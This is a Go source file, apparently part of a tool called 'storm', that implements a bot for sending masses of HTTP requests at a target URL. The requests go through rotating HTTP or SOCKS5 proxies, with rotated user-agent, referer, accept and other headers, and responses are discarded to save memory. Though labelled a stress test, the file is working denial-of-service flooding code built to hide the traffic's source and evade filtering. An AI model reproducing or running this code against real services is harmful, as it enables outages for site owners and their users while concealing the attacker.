package client

import (
	"errors"
	"fmt"
	"io"
	"log"
	"os"
	"path"
	"strings"
	"sync"
	"sync/atomic"
	"z3ntl3/storm/globals"
	lb "z3ntl3/storm/lb/robin"

	"github.com/valyala/fasthttp"
	"github.com/valyala/fasthttp/fasthttpproxy"
)

const PoolSize = 1_000

type Bot struct {
	Rsrc resources
	Exit atomic.Uint32
	*sync.Mutex
}

type resources struct {
	Proxies  *lb.RoundRobin[string]
	Accepts  *lb.RoundRobin[string]
	Headers  *lb.RoundRobin[string]
	Referers *lb.RoundRobin[string]
	UAs      *lb.RoundRobin[string]
}

type MessageContext struct {
	Msg  string
	Err  error
	Kill bool
}

func New() *Bot {
	cwd, err := os.Getwd()
	if err != nil {
		log.Fatal(err)
	}

	instance := new(Bot)
	instance.Mutex = &sync.Mutex{}

	for i, path_ := range []string{globals.Accepts, globals.Headers, globals.ProxyFile, globals.Refs, globals.UAs} {
		f, err := os.Open(path.Join(cwd, path_))
		if err != nil {
			log.Fatal(err)
		}

		contents, err := io.ReadAll(f)
		if err != nil {
			log.Fatal(err)
		}

		contents = []byte(strings.TrimSpace(string(contents)))
		parts := strings.Split(string(contents), "\n")
		lb := lb.New(parts...)

		switch i {
		case 0:
			instance.Rsrc.Accepts = lb
		case 1:
			instance.Rsrc.Headers = lb
		case 2:
			instance.Rsrc.Proxies = lb
		case 3:
			instance.Rsrc.Referers = lb
		case 4:
			instance.Rsrc.UAs = lb
		default:
			log.Fatal("could not match any data to use for the stress test")
		}
	}

	return instance
}

func (c *Bot) SigExit() {
	c.Exit.Store(1)
}

func (c *Bot) ShouldExit() bool {
	if c.Exit.Load() == 1 {
		return true
	} else {
		return false
	}
}

// Dedicated to be spawned on a goroutine
// The body is thread-safe
//
// Arguments should be passed by [Bot]'s Next method on the fields as they comfort [lb.RoundRobin]
func (c *Bot) Stress(proxy string, th_id uint64, pool_msg chan<- MessageContext, done chan<- int) {
	defer func() {
		recover() // may panic due to send on closed channel after a kill sig
		done <- 1
	}()
	var client fasthttp.Client

	proxy = strings.Trim(proxy, "\r\n")
	switch globals.ProxyProto {
	case "http", "https":
		client.Dial = fasthttpproxy.FasthttpHTTPDialerDualStack(proxy)
	case "socks5":
		client.Dial = fasthttpproxy.FasthttpSocksDialerDualStack(proxy)
	default:
		pool_msg <- MessageContext{
			Err:  errors.New("unsupported proxy protocol: can only use socks5 or http/https"),
			Kill: true,
		}
		return
	}

	req := fasthttp.AcquireRequest()
	req.SetRequestURI(globals.TargetURL) // *&x will be simplified to x. It will not copy x. (SA4001)

	// set all headers
	for header := range c.Rsrc.Headers.Iter() {
		*header = strings.Trim(*header, "\r\n")

		if !strings.Contains(*header, ": ") {
			continue
		}
		h := strings.Split(*header, ": ")
		req.Header.Set(h[0], h[1])
	}

	// set some specific header using LB
	req.Header.Set("Accept", *c.Rsrc.Accepts.Next())
	req.Header.Set("Referer", *c.Rsrc.Referers.Next())
	req.Header.Set("User-Agent", *c.Rsrc.UAs.Next())

	// do not observe response as to save memory
	err := client.Do(req, nil)
	if err != nil {
		pool_msg <- MessageContext{
			Err: fmt.Errorf("err: thread [%d] sending payload responded with: %s", th_id, err),
		}
		return
	}

	pool_msg <- MessageContext{
		Msg: fmt.Sprintf("thread [%d] payload successfully sent [%s]: %s\n", th_id, proxy, req.Header.String()),
	}
}
